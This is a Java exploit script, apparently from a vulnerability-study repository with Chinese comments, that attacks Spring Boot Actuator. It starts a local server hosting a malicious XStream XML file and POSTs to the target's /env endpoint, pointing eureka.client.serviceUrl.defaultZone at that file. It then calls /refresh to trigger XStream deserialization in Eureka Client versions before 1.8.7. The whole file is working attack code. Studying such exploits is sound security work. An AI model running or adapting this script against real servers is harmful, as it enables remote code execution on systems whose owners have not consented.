/*
 * [业务问题]: Spring Boot Actuator /env 端点利用 Eureka 结合 XStream 漏洞。
 * [实现逻辑]: 注入 eureka.client.serviceUrl.defaultZone 配置指向恶意 XML，利用 Eureka Client 的 XStream 反序列化触发攻击（适用于 Eureka-Client < 1.8.7）。
 */
package com.security.bug.spring.actuator;

import com.security.bug.common.server.HTTPServer;
import java.io.UnsupportedEncodingException;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;

/**
 * Spring Boot Actuator Eureka + XStream 攻击验证。
 */
public class EurekaAttackForXStream {

  static {
    HTTPServer.filePath = "/Users/xuanyonghao/security/java/my-project/learnjavabug/spring/spring-boot-actuator-bug/actuator-1.4/src/main/resources/xstream-evil.xml";
    HTTPServer.PORT = 22222;
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws UnsupportedEncodingException {
    String payload = "eureka.client.serviceUrl.defaultZone=http://127.0.0.1:22222/xstream-evil.xml";
    String target = "http://localhost:8080";

    HttpPost httpPost = new HttpPost(target + "/env");
    HttpEntity httpEntity = new StringEntity(payload, "application/x-www-form-urlencoded", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    httpPost = new HttpPost(target + "/refresh");
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
